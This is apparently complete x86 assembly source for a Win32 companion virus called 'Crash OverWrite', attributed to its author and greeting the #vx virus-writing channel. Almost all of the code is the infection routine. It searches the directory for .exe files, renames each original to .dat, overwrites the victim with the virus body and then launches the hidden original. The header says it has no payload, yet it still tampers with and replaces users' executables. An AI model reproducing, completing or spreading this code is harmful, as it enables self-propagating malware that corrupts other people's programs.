comment *

   Name:  Crash OverWrite :-)
   Coder: BeLiAL
   Type: Companion
   Anything else: NO
   
   This is my first win32 virus.Its only a
   companionvirus but it does his work very
   well.Its perhaps coded not so fine but
   im sure nobody will care.It infects all
   files in the directory and renames
   the victimfile to .dat .Perhaps i will make
   infecting more files...
   Its without payload and any  weapons :)
   It Doesnt infect dos-files correctly.
   Greetings to the whole #vx channel on undernet
  
   BeLiAL
*

  .386
  .model flat
  Locals
  Jumps

  Extrn FindFirstFileA :PROC
  Extrn FindNextFileA  :PROC
  Extrn CreateFileA    :PROC
  Extrn WriteFile      :PROC
  Extrn ReadFile       :PROC
  Extrn GlobalAlloc    :PROC
  Extrn GlobalFree     :PROC
  Extrn ExitProcess    :PROC
  Extrn WinExec        :PROC
  Extrn CopyFileA      :PROC
  Extrn CloseHandle    :PROC
  Extrn SetFilePointer :PROC
  Extrn GetFileSize    :PROC

  .data

  MAX_PATH     EQU 0ffh
  FALSE        EQU 0
  changeoffset EQU 094fh
  winsize      EQU 01h

   FILETIME struct
   dwLowDateTime         DWORD   ?
   dwHighDateTime        DWORD   ?      
   FILETIME ends

   WIN32_FIND_DATA struct
   dwFileAttributes      DWORD   ?
   ftCreationTime        FILETIME <>
   ftLastAccessTime      FILETIME <>        
   ftLastWriteTime       FILETIME <>      
   nFileSizeHigh         DWORD   ?        
   nFileSizeLow          DWORD   ?      
   dwReserved0           DWORD   ?       
   dwReserved1           DWORD   ?       
   cFileName             BYTE MAX_PATH dup(?)
   cAlternate            BYTE 0eh dup(?)   
   ends
   FindFileData    WIN32_FIND_DATA <>

  memptr       dd   0
  counter1     dd   0
  filehandle   dd   0
  filesize     dd   00001000h
  exefile      db  '*.exe',0
  myname       db  'crashoverwrite.exe',0
               dd   0
               dd   0
  secbuffer    dd   0
               dd   0
               dd   0
  searchhandle dd   0
               db  '[Crash OverWrite] coded by BeLiAL'

  .code

start:
  push offset FindFileData
  push offset exefile
  call FindFirstFileA
  mov searchhandle,eax
already_infected:
  mov eax,dword ptr nFileSizeLow.FindFileData
  cmp eax,00001000h
  je find_next_victim
  mov eax,offset cFileName.FindFileData
  jmp find_dot1
find_next_victim:
  push offset FindFileData
  push searchhandle
  call FindNextFileA
  test eax,eax
  jz reanimate
  jmp already_infected
find_dot1:
  cmp byte ptr ds:[eax],'.'
  je next_step1
  add eax,1
  jmp find_dot1
next_step1:
  add eax,1
  push eax
  mov byte ptr ds:[eax],'d'
  add eax,1
  mov byte ptr ds:[eax],'a'
  add eax,1
  mov byte ptr ds:[eax],'t'
  mov ebx,offset cFileName.FindFileData
  mov eax,offset secbuffer
find_dot2:
  mov dh,byte ptr ds:[ebx]
  cmp edx,0
  je next_step2
  mov byte ptr ds:[eax],dh
  add ebx,1
  add eax,1
  jmp find_dot2
next_step2:
  pop eax
  push FALSE
  push offset secbuffer
  mov byte ptr ds:[eax],'e'
  add eax,1
  mov byte ptr ds:[eax],'x'
  add eax,1
  mov byte ptr ds:[eax],'e'
  push offset cFileName.FindFileData
  call CopyFileA
  push FALSE
  push offset cFileName.FindFileData
  push offset myname
  call CopyFileA
open_victim:
  push 0
  push 080h        
  push 3h         
  push 0h          
  push 0h          
  push 0c0000000h  
  push offset FindFileData.cFileName
  Call CreateFileA 
  mov filehandle,eax
  cmp eax,0ffffffffh
  je find_next_victim
getmemory:
  push filesize 
  push 0
  Call GlobalAlloc  ;get the memory
  mov edx,eax
  cmp eax,0
  je close_file
  push edx
copyinmemory:
  push 0
  push offset counter1
  push filesize
  push edx
  push filehandle
  Call ReadFile
  pop edx
  mov dword ptr memptr,edx    ;for later use
  add edx,changeoffset
  mov eax,offset cFileName.FindFileData
modify_victim:
  mov bh,byte ptr ds:[eax]
  mov byte ptr ds:[edx],bh
  cmp bh,0
  je set_pointer
  add eax,1
  add edx,1
  jmp modify_victim
set_pointer:
  push 0
  push 0
  push 0
  push filehandle
  call SetFilePointer
copy_to_file:
  push 0
  push offset counter1
  push filesize
  push memptr
  push filehandle
  call WriteFile
close_file:
  push filehandle
  call CloseHandle
  jmp find_next_victim
reanimate:
  mov eax,offset myname
find_dot3:
  mov bx,word ptr ds:[eax]
  cmp bx,'e.'
  je next_step3
  cmp bx,'E.'      
  je next_step3
  add eax,1
  jmp find_dot3
next_step3:
  add eax,1
  mov byte ptr ds:[eax],'d'
  add eax,1
  mov byte ptr ds:[eax],'a'
  add eax,1
  mov byte ptr ds:[eax],'t'
  add eax,1
  mov byte ptr ds:[eax],00h
that_was_all:
  push winsize
  push offset myname
  call WinExec
final:
  push 0
  call ExitProcess

  ends
  end start

